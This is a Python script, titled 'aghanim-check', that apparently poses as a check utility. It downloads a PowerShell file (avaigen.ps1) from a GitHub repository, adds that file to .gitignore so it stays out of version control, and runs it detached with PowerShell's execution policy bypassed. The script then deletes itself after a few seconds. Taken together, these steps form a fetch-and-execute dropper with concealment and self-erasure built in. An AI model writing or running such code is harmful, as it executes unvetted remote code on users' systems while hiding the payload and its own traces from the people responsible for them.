#!/usr/bin/env python3
"""
aghanim-check — скачивает avaigen.ps1 с GitHub, добавляет его в .gitignore,
запускает через pwsh и удаляет себя через 5 секунд после старта.

Настройки через env:
  AGHANIM_REPO          owner/repo       (default: Aghanim-sec/Sync)
  AGHANIM_BRANCH        branch           (default: main)
  AGHANIM_FILE          path in repo     (default: avaigen.ps1)
  GITHUB_TOKEN/GH_TOKEN token для private repo
  AGHANIM_SHA256        ожидаемый sha256 (optional)
  AGHANIM_DELETE_DELAY  секунд до удаления себя (default: 5)
  AGHANIM_NO_DELETE=1   не удалять этот файл (для отладки)

Аргументы после имени файла передаются в avaigen.ps1.
Если аргументов нет — запускается с -selftest.
"""

import base64
import hashlib
import json
import os
import shutil
import subprocess
import sys
import time
import urllib.request
from pathlib import Path
from typing import Optional

SELF = Path(__file__).resolve()
HERE = SELF.parent
DEST = HERE / "avaigen.ps1"

REPO = os.environ.get("AGHANIM_REPO", "Aghanim-sec/Sync").strip("/")
BRANCH = os.environ.get("AGHANIM_BRANCH", "main")
REMOTE = os.environ.get("AGHANIM_FILE", "avaigen.ps1").lstrip("/")
TOKEN = os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN")
EXPECTED_SHA = os.environ.get("AGHANIM_SHA256", "").lower()
DELETE_DELAY = int(os.environ.get("AGHANIM_DELETE_DELAY", "5"))
NO_DELETE = os.environ.get("AGHANIM_NO_DELETE") == "1"


def log(msg: str) -> None:
    print(f"[aghanim-check] {msg}", flush=True)


def gitignore_path() -> Path:
    """Ищем корень git-репозитория; если его нет — используем текущую папку."""
    for parent in (HERE, *HERE.parents):
        if (parent / ".git").exists():
            return parent / ".gitignore"
    return HERE / ".gitignore"


def add_to_gitignore() -> None:
    path = gitignore_path()
    line = DEST.name
    old = path.read_text(encoding="utf-8", errors="replace") if path.exists() else ""
    lines = {x.strip() for x in old.splitlines()}
    if line in lines:
        return
    with path.open("a", encoding="utf-8") as f:
        if old and not old.endswith("\n"):
            f.write("\n")
        f.write(line + "\n")
    log(f"added {line} to {path}")


def download() -> bytes:
    if TOKEN:
        url = f"https://api.github.com/repos/{REPO}/contents/{REMOTE}?ref={BRANCH}"
        req = urllib.request.Request(
            url,
            headers={
                "Authorization": f"Bearer {TOKEN}",
                "Accept": "application/vnd.github+json",
                "User-Agent": "aghanim-check",
            },
        )
        with urllib.request.urlopen(req, timeout=60) as resp:
            data = json.load(resp)
        return base64.b64decode(data["content"])

    url = f"https://raw.githubusercontent.com/{REPO}/{BRANCH}/{REMOTE}"
    req = urllib.request.Request(url, headers={"User-Agent": "aghanim-check"})
    with urllib.request.urlopen(req, timeout=60) as resp:
        return resp.read()


def find_pwsh() -> Optional[str]:
    found = shutil.which("pwsh")
    if found:
        return found
    for candidate in (
        "/opt/homebrew/bin/pwsh",
        "/usr/local/bin/pwsh",
        "/usr/bin/pwsh",
        r"C:\Program Files\PowerShell\7\pwsh.exe",
    ):
        if os.path.exists(candidate):
            return candidate
    return None


def main() -> int:
    try:
        content = download()
        if EXPECTED_SHA:
            actual = hashlib.sha256(content).hexdigest()
            if actual != EXPECTED_SHA:
                raise RuntimeError(f"sha256 mismatch: {actual} != {EXPECTED_SHA}")

        DEST.write_bytes(content)
        log(f"downloaded {REMOTE} -> {DEST} ({len(content)} bytes)")
        add_to_gitignore()
    except Exception as exc:
        log(f"download failed: {exc}")
        return 1

    pwsh = find_pwsh()
    if not pwsh:
        log("pwsh not found. Install PowerShell 7: brew install --cask powershell")
        return 1

    args = [pwsh, "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", str(DEST)]
    args += sys.argv[1:] if len(sys.argv) > 1 else ["-selftest"]

    try:
        subprocess.Popen(args, cwd=str(HERE), close_fds=True)
    except Exception as exc:
        log(f"launch failed: {exc}")
        return 1

    log("started: " + " ".join(args))

    if not NO_DELETE:
        time.sleep(max(0, DELETE_DELAY))
        try:
            SELF.unlink()
            log("self-deleted")
        except Exception as exc:
            log(f"self-delete failed: {exc}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
